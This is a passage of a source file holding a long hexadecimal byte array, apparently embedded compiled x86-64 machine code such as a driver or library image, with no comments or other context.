    0xFF, 0xFF, 0x84, 0xC0, 0x74, 0x0F, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48,
    0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x8B, 0x8F, 0x50, 0x06, 0x00, 0x00, 0x33, 0xD2, 0xB8, 0xF6, 0xFF,
    0xFF, 0xFF, 0x39, 0x4B, 0x2C, 0x0F, 0x44, 0xC2, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x83, 0xC4,
    0x20, 0x5F, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x83, 0xC4,
    0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x45, 0x33, 0xFF, 0x48,
    0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8B, 0xE8, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x4C,
    0x8B, 0xE2, 0x4C, 0x8B, 0xF1, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x44, 0x88, 0x7C, 0x24, 0x28, 0x72,
    0x50, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x49, 0x8B, 0xC6, 0x48, 0x23,
    0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x36, 0x41, 0x81, 0x7E, 0x08, 0x64,
    0x72, 0x69, 0x62, 0x75, 0x2C, 0x49, 0x8D, 0x80, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x0F, 0x82, 0x3D, 0x01, 0x00, 0x00, 0x49, 0x8B, 0xC0, 0x48, 0x23, 0xC1, 0x48, 0x3B,
    0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x29, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x75,
    0x12, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D,
    0x41, 0x5C, 0xC3, 0x49, 0x8B, 0x4E, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x60, 0x48, 0x89, 0x6C, 0x24,
    0x68, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x89, 0x74, 0x24, 0x70, 0x48, 0x89, 0x7C, 0x24, 0x30,
    0xE8, 0x7B, 0x45, 0x00, 0x00, 0x49, 0x8D, 0x6E, 0x40, 0x48, 0x85, 0xED, 0x74, 0x5A, 0x66, 0x90,
    0x8B, 0x85, 0x08, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x45, 0x41, 0x8B, 0xFF, 0x49, 0x8B, 0xF7,
    0x48, 0x8D, 0x5D, 0x08, 0x83, 0x7B, 0x10, 0x04, 0x75, 0x25, 0x48, 0x8B, 0x0B, 0x48, 0x85, 0xC9,
    0x74, 0x1D, 0xE8, 0x39, 0x4E, 0x00, 0x00, 0x49, 0x3B, 0xC4, 0x74, 0x60, 0x48, 0x8B, 0x4B, 0x08,
    0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x76, 0x4E, 0x00, 0x00, 0x49, 0x3B, 0xC4, 0x74, 0x4D, 0x83,
    0xC7, 0x01, 0x48, 0x83, 0xC6, 0x01, 0x48, 0x83, 0xC3, 0x18, 0x83, 0xFF, 0x40, 0x72, 0xC5, 0x48,
    0x8B, 0x6D, 0x00, 0x48, 0x85, 0xED, 0x75, 0xA8, 0x49, 0x8B, 0x4E, 0x28, 0x48, 0x8D, 0x54, 0x24,
    0x20, 0xE8, 0x2A, 0x45, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x70,
    0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x48,
    0x83, 0xC4, 0x38, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0xC3, 0x8B, 0xC7, 0x48, 0x8D,
    0x0C, 0x40, 0x48, 0x8B, 0x4C, 0xCD, 0x08, 0xE8, 0x94, 0x4E, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x0C,
    0x85, 0xC0, 0x74, 0x2F, 0x48, 0x8D, 0x34, 0x76, 0x49, 0x8B, 0xDF, 0x8B, 0xF8, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4C, 0xF5, 0x08, 0x48, 0x8B, 0xD3, 0xE8, 0xC3, 0x4E, 0x00, 0x00, 0x4D, 0x89, 0x7D,
    0x08, 0x49, 0x83, 0xC5, 0x10, 0x49, 0x89, 0x45, 0xF0, 0x48, 0x83, 0xC3, 0x01, 0x48, 0x83, 0xEF,
    0x01, 0x75, 0xDD, 0x49, 0x8B, 0x4E, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0xAF, 0x44, 0x00,
    0x00, 0x33, 0xC0, 0xEB, 0x86, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38, 0x41, 0x5F,
    0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
    0x89, 0x78, 0x20, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x30, 0x4C, 0x8B, 0xE1, 0x48, 0x8B, 0x49, 0x28,
    0x48, 0x8B, 0xEA, 0x48, 0x8D, 0x50, 0xE8, 0x48, 0xC7, 0x40, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC6,
    0x40, 0xF0, 0x00, 0xE8, 0x38, 0x44, 0x00, 0x00, 0x49, 0x8D, 0x74, 0x24, 0x40, 0x48, 0x85, 0xF6,
    0x74, 0x43, 0x8B, 0x86, 0x08, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x31, 0x33, 0xFF, 0x48, 0x8D,
    0x5E, 0x10, 0x83, 0x7B, 0x08, 0x05, 0x75, 0x19, 0x48, 0x83, 0x7B, 0xF8, 0x00, 0x74, 0x12, 0x48,
    0x8B, 0x0B, 0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x44, 0x4D, 0x00, 0x00, 0x48, 0x3B, 0xC5, 0x74,
    0x40, 0x83, 0xC7, 0x01, 0x48, 0x83, 0xC3, 0x18, 0x83, 0xFF, 0x40, 0x72, 0xD5, 0x48, 0x8B, 0x36,
    0x48, 0x85, 0xF6, 0x75, 0xBD, 0x49, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8,
    0xFC, 0x43, 0x00, 0x00, 0x32, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48,
    0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C,
    0xC3, 0x49, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0xD0, 0x43, 0x00, 0x00,
    0xB0, 0x01, 0xEB, 0xD2, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x20, 0x44,
    0x89, 0x40, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x30,
    0x4C, 0x8B, 0xF9, 0x48, 0x8B, 0x49, 0x28, 0x4C, 0x8B, 0xF2, 0x45, 0x33, 0xE4, 0x48, 0x8D, 0x50,
    0xC8, 0x4D, 0x8B, 0xE9, 0x4C, 0x89, 0x60, 0xC8, 0x44, 0x88, 0x60, 0xD0, 0xE8, 0x5F, 0x43, 0x00,
    0x00, 0x49, 0x8D, 0x6F, 0x40, 0x48, 0x85, 0xED, 0x74, 0x51, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x8B, 0x85, 0x08, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x38, 0x41, 0x8B, 0xFC, 0x49, 0x8B, 0xF4,
    0x48, 0x8D, 0x5D, 0x10, 0x83, 0x7B, 0x08, 0x05, 0x75, 0x18, 0x4C, 0x39, 0x63, 0xF8, 0x74, 0x12,
    0x48, 0x8B, 0x0B, 0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x63, 0x4C, 0x00, 0x00, 0x49, 0x3B, 0xC6,
    0x74, 0x49, 0x83, 0xC7, 0x01, 0x48, 0x83, 0xC6, 0x01, 0x48, 0x83, 0xC3, 0x18, 0x83, 0xFF, 0x40,
    0x72, 0xD2, 0x48, 0x8B, 0x6D, 0x00, 0x48, 0x85, 0xED, 0x75, 0xB5, 0x49, 0x8B, 0x4F, 0x28, 0x48,
    0x8D, 0x54, 0x24, 0x20, 0xE8, 0x17, 0x43, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B,
    0x5C, 0x24, 0x60, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x83, 0xC4,
    0x30, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0xC3, 0x8B, 0xC7, 0x48, 0x8D, 0x0C,
    0x40, 0x48, 0x8B, 0x4C, 0xCD, 0x08, 0xE8, 0x85, 0x4C, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x70, 0x48,
    0xC1, 0xE8, 0x0C, 0x3B, 0xC1, 0x0F, 0x46, 0xC8, 0x85, 0xC9, 0x74, 0x25, 0x48, 0x8D, 0x3C, 0x76,
    0x8B, 0xD9, 0x48, 0x8B, 0x4C, 0xFD, 0x08, 0x49, 0x8B, 0xD4, 0xE8, 0xB1, 0x4C, 0x00, 0x00, 0x49,
    0x83, 0xC5, 0x08, 0x49, 0x83, 0xC4, 0x01, 0x48, 0x83, 0xEB, 0x01, 0x49, 0x89, 0x45, 0xF8, 0x75,
    0xE1, 0x49, 0x8B, 0x4F, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0xA1, 0x42, 0x00, 0x00, 0x33,
    0xC0, 0xEB, 0x8B, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x31, 0x45,
    0x33, 0xF6, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x4D,
    0x8B, 0xE0, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0xF9, 0x45, 0x8B, 0xEE, 0x4D, 0x8B, 0xFE, 0xBB, 0xFF,
    0xFF, 0xFF, 0xFF, 0x0F, 0x82, 0x41, 0x01, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC7, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85,
    0xC0, 0x0F, 0x85, 0x23, 0x01, 0x00, 0x00, 0x81, 0x7F, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85,
    0x16, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x82, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00,
    0x00, 0x72, 0x10, 0x48, 0x8B, 0xC2, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x14, 0x48, 0x85,
    0xC0, 0x74, 0x0F, 0x48, 0x85, 0xD2, 0x74, 0x0A, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0xE9, 0xED, 0x00,
    0x00, 0x00, 0x49, 0x8D, 0x80, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72,
    0x10, 0x49, 0x8B, 0xC0, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x0A, 0x48, 0x85, 0xC0, 0x74,
    0x05, 0x4D, 0x85, 0xC0, 0x75, 0xD2, 0x48, 0x8B, 0x4E, 0x50, 0xE8, 0xD1, 0x48, 0x00, 0x00, 0x4C,
    0x39, 0x6E, 0x58, 0x0F, 0x84, 0x8D, 0x00, 0x00, 0x00, 0x48, 0x85, 0xED, 0x74, 0x1D, 0x4C, 0x39,
    0x6F, 0x30, 0x75, 0x13, 0x48, 0x8B, 0x0F, 0x48, 0x8D, 0x57, 0x30, 0xE8, 0xC0, 0xE9, 0xFF, 0xFF,
    0x85, 0xC0, 0x44, 0x8B, 0xE8, 0x75, 0x04, 0x4C, 0x8B, 0x7F, 0x30, 0x4D, 0x85, 0xE4, 0x74, 0x09,
    0x45, 0x85, 0xED, 0x75, 0x04, 0x48, 0x8B, 0x5E, 0x60, 0x44, 0x39, 0x77, 0x38, 0x75, 0x5B, 0x45,
    0x85, 0xED, 0x75, 0x56, 0xC7, 0x47, 0x38, 0x01, 0x00, 0x00, 0x00, 0x83, 0x46, 0x68, 0x01, 0x8B,
    0x46, 0x68, 0x83, 0xF8, 0x01, 0x75, 0x43, 0x4C, 0x8B, 0x4E, 0x58, 0x45, 0x8D, 0x45, 0x20, 0x49,
    0x8D, 0x91, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xCA, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x8B, 0x02, 0x48, 0x83, 0xC1, 0x60, 0x48, 0x83, 0xC2, 0x60, 0x25, 0x00, 0xF0, 0xFF, 0xFF, 0x49,
    0x83, 0xE8, 0x01, 0x87, 0x41, 0xA0, 0x75, 0xE8, 0x4D, 0x87, 0x71, 0x18, 0x48, 0x8B, 0xCE, 0xE8,
    0xBC, 0xE9, 0xFF, 0xFF, 0xEB, 0x04, 0x41, 0x83, 0xCD, 0xFF, 0x48, 0x8B, 0x4E, 0x50, 0xE8, 0x5D,
    0x48, 0x00, 0x00, 0x4D, 0x85, 0xE4, 0x74, 0x04, 0x49, 0x89, 0x1C, 0x24, 0x48, 0x85, 0xED, 0x74,
    0x04, 0x4C, 0x89, 0x7D, 0x00, 0x41, 0x8B, 0xC5, 0xEB, 0x05, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48,
    0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x58, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48, 0x83,
    0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
    0x8B, 0x39, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x33, 0xF6, 0x48, 0x3D, 0x00, 0x20, 0x00,
    0x00, 0x48, 0x8B, 0xD9, 0x0F, 0x82, 0x88, 0x00, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05, 0x48,
    0x85, 0xC0, 0x75, 0x6E, 0x81, 0x7B, 0x08, 0x64, 0x72, 0x69, 0x62, 0x75, 0x65, 0x48, 0x8B, 0x4F,
    0x50, 0xE8, 0x9A, 0x47, 0x00, 0x00, 0x48, 0x8B, 0x53, 0x30, 0x48, 0x85, 0xD2, 0x74, 0x16, 0x48,
    0x8B, 0xCF, 0xE8, 0xD9, 0xE8, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xF0, 0x75, 0x08, 0x48, 0xC7, 0x43,
    0x30, 0x00, 0x00, 0x00, 0x00, 0x83, 0x7B, 0x38, 0x00, 0x74, 0x1C, 0x85, 0xF6, 0x75, 0x18, 0x89,
    0x73, 0x38, 0x8B, 0x47, 0x68, 0x85, 0xC0, 0x74, 0x0E, 0x83, 0x47, 0x68, 0xFF, 0x75, 0x08, 0x48,
    0x8B, 0xCF, 0xE8, 0xF9, 0xE8, 0xFF, 0xFF, 0x48, 0x8B, 0x4F, 0x50, 0xE8, 0x80, 0x47, 0x00, 0x00,
    0x8B, 0xC6, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20,
    0x5F, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0xB8, 0xFE, 0xFF, 0xFF,
    0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48,
    0x8B, 0xFA, 0x48, 0x8B, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x8B, 0x4F, 0x28, 0x48, 0xC7,
    0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x28, 0x00, 0xE8, 0xBF, 0x3F, 0x00,
    0x00, 0x48, 0x8D, 0x6F, 0x40, 0x48, 0x85, 0xED, 0x4C, 0x8B, 0xC5, 0x74, 0x2F, 0x66, 0x66, 0x90,
    0x41, 0x8B, 0x80, 0x08, 0x06, 0x00, 0x00, 0x83, 0xF8, 0x40, 0x73, 0x18, 0x33, 0xC9, 0x49, 0x8D,
    0x40, 0x08, 0x48, 0x83, 0x38, 0x00, 0x74, 0x41, 0x83, 0xC1, 0x01, 0x48, 0x83, 0xC0, 0x18, 0x83,
    0xF9, 0x40, 0x72, 0xEE, 0x4D, 0x8B, 0x00, 0x4D, 0x85, 0xC0, 0x75, 0xD4, 0x48, 0x8B, 0x4F, 0x28,
    0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x89, 0x5C, 0x24, 0x40, 0xE8, 0x91, 0x3F, 0x00, 0x00, 0xB9,
    0x10, 0x06, 0x00, 0x00, 0xE8, 0xC7, 0x55, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x75,
    0x4E, 0x8D, 0x43, 0xF8, 0xE9, 0x96, 0x00, 0x00, 0x00, 0x41, 0x83, 0x80, 0x08, 0x06, 0x00, 0x00,
    0x01, 0x48, 0x8B, 0x06, 0x48, 0x8D, 0x0C, 0x49, 0x49, 0x89, 0x44, 0xC8, 0x08, 0x48, 0x8B, 0x46,
    0x08, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x49, 0x89, 0x44, 0xC8, 0x10, 0x48, 0x8B, 0x46, 0x10, 0x49,
    0x89, 0x44, 0xC8, 0x18, 0x48, 0x8B, 0x4F, 0x28, 0xE8, 0x43, 0x3F, 0x00, 0x00, 0x33, 0xC0, 0x48,
    0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0x83,
    0x80, 0x08, 0x06, 0x00, 0x00, 0x01, 0x48, 0x8B, 0x06, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x89,
    0x83, 0xF0, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x46, 0x08, 0x48, 0x89, 0x83, 0xF8, 0x05, 0x00, 0x00,
    0x48, 0x8B, 0x46, 0x10, 0x48, 0x89, 0x83, 0x00, 0x06, 0x00, 0x00, 0x48, 0x8B, 0x4F, 0x28, 0xE8,
    0xDC, 0x3E, 0x00, 0x00, 0x4C, 0x8B, 0x5D, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x4C, 0x89, 0x1B,
    0x48, 0x8B, 0x4F, 0x28, 0x48, 0x89, 0x5D, 0x00, 0xE8, 0xE3, 0x3E, 0x00, 0x00, 0x33, 0xC0, 0x48,
    0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83,
    0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x6B, 0x20, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xEC,
    0x50, 0x45, 0x33, 0xF6, 0x48, 0x85, 0xD2, 0x45, 0x8B, 0xE0, 0x48, 0x8B, 0xEA, 0x4C, 0x8B, 0xE9,
    0x4D, 0x89, 0x73, 0xB8, 0x45, 0x88, 0x73, 0xC0, 0x75, 0x12, 0x8D, 0x42, 0xFE, 0x49, 0x8B, 0x6B,
    0x20, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0xC3, 0x48, 0x8B, 0x49, 0x28,
    0x48, 0x89, 0x5C, 0x24, 0x70, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x89, 0x74, 0x24, 0x78, 0x48,
    0x89, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0xE8, 0x44, 0x3E, 0x00, 0x00, 0x49, 0x8D, 0x75, 0x40,
    0x48, 0x85, 0xF6, 0x74, 0x50, 0x8B, 0x86, 0x08, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x3E, 0x41,
    0x8B, 0xFE, 0x48, 0x8D, 0x5E, 0x08, 0x44, 0x39, 0x63, 0x10, 0x75, 0x25, 0x48, 0x8B, 0x0B, 0x48,
    0x85, 0xC9, 0x74, 0x1D, 0xE8, 0x07, 0x47, 0x00, 0x00, 0x48, 0x3B, 0xC5, 0x74, 0x5F, 0x48, 0x8B,
    0x4B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x44, 0x47, 0x00, 0x00, 0x48, 0x3B, 0xC5, 0x74,
    0x4C, 0x83, 0xC7, 0x01, 0x48, 0x83, 0xC3, 0x18, 0x83, 0xFF, 0x40, 0x72, 0xC9, 0x48, 0x8B, 0x36,
    0x48, 0x85, 0xF6, 0x75, 0xB0, 0x49, 0x8B, 0x4D, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0xFD,
    0x3D, 0x00, 0x00, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x8B, 0x5C,
    0x24, 0x70, 0x48, 0x8B, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0x88, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0xC3, 0x48, 0x8D, 0x54,
    0x24, 0x30, 0x8B, 0xC7, 0x48, 0x8D, 0x0C, 0x40, 0x48, 0x8B, 0x44, 0xCE, 0x08, 0x48, 0x89, 0x02,
    0x48, 0x8B, 0x44, 0xCE, 0x10, 0x48, 0x89, 0x42, 0x08, 0x48, 0x8B, 0x44, 0xCE, 0x18, 0x44, 0x89,
    0x74, 0xCE, 0x18, 0x4C, 0x89, 0x74, 0xCE, 0x08, 0x4C, 0x89, 0x74, 0xCE, 0x10, 0x49, 0x8B, 0x4D,
    0x28, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x91, 0x3D, 0x00, 0x00, 0x48,
    0x8B, 0x4C, 0x24, 0x38, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x33, 0xD2, 0xE8, 0xF0, 0x47, 0x00, 0x00,
    0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x33, 0xD2, 0xE8, 0xDF, 0x47, 0x00,
    0x00, 0x33, 0xC0, 0xE9, 0x70, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x20, 0x55, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x57, 0x48, 0x83, 0xEC,
    0x20, 0x4C, 0x8B, 0xE1, 0x48, 0x83, 0xC9, 0xFF, 0x49, 0x8D, 0x78, 0x20, 0x33, 0xC0, 0x49, 0x8B,
    0xE8, 0x48, 0x8B, 0xDA, 0xF2, 0xAE, 0x45, 0x33, 0xED, 0x48, 0xF7, 0xD1, 0x4C, 0x8D, 0x79, 0xFF,
    0x49, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0x36, 0x44, 0x00, 0x00, 0x48, 0x8B, 0x53, 0x10, 0x48, 0x85,
    0xD2, 0x74, 0x23, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x4A, 0x08, 0x48, 0x8B, 0x45, 0x18, 0x48, 0x39, 0x41, 0x08, 0x74, 0x29, 0x48, 0x8B,
    0x12, 0x48, 0x85, 0xD2, 0x75, 0xEA, 0x49, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0x30, 0x44, 0x00, 0x00,
    0xB8, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x68, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F,
    0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5D, 0xC3, 0x81, 0x79, 0x34, 0x18, 0x82, 0x22, 0x00, 0x48, 0x8B,
    0xF9, 0x74, 0x21, 0x49, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0x03, 0x44, 0x00, 0x00, 0xB8, 0xF7, 0xFF,
    0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x68, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5D, 0x41,
    0x5C, 0x5F, 0x5D, 0xC3, 0x48, 0x8B, 0x41, 0x08, 0x44, 0x8B, 0x41, 0x2C, 0x48, 0x89, 0x74, 0x24,
    0x58, 0x4C, 0x89, 0x74, 0x24, 0x60, 0x44, 0x8B, 0x71, 0x24, 0x4C, 0x03, 0xC0, 0x33, 0xF6, 0x4C,
    0x03, 0xF0, 0x4C, 0x89, 0x44, 0x24, 0x50, 0x39, 0x71, 0x28, 0x76, 0x54, 0x49, 0x8B, 0xDE, 0x90,
    0x8B, 0x47, 0x20, 0x39, 0x43, 0x04, 0x73, 0x29, 0x8B, 0x13, 0x8B, 0x47, 0x30, 0x4A, 0x8D, 0x4C,
    0x3A, 0x01, 0x48, 0x3B, 0xC8, 0x77, 0x1A, 0x4A, 0x8D, 0x0C, 0x02, 0x4D, 0x8D, 0x47, 0x01, 0x48,
    0x8D, 0x55, 0x20, 0xE8, 0x18, 0xE6, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0x17, 0x4C, 0x8B, 0x44, 0x24,
    0x50, 0x83, 0xC6, 0x01, 0x48, 0x83, 0xC3, 0x08, 0x3B, 0x77, 0x28, 0x72, 0xC3, 0x48, 0x83, 0xCF,
    0xFF, 0xEB, 0x11, 0x45, 0x8B, 0x6C, 0xF6, 0x04, 0x4C, 0x03, 0x6F, 0x08, 0x33, 0xFF, 0xEB, 0x04,
    0x48, 0x83, 0xCF, 0xFF, 0x49, 0x8B, 0x4C, 0x24, 0x20, 0xE8, 0x62, 0x43, 0x00, 0x00, 0x4C, 0x8B,
    0x74, 0x24, 0x60, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x68, 0x4C, 0x89, 0x6D,
    0x18, 0x8B, 0xC7, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5D, 0xC3,
    0x4C, 0x8B, 0x51, 0x28, 0x4D, 0x85, 0xD2, 0x75, 0x18, 0x48, 0x89, 0x51, 0x28, 0x48, 0x8B, 0x54,
    0x24, 0x28, 0x4C, 0x89, 0x41, 0x30, 0x48, 0x89, 0x51, 0x40, 0x4C, 0x89, 0x49, 0x38, 0x33, 0xC0,
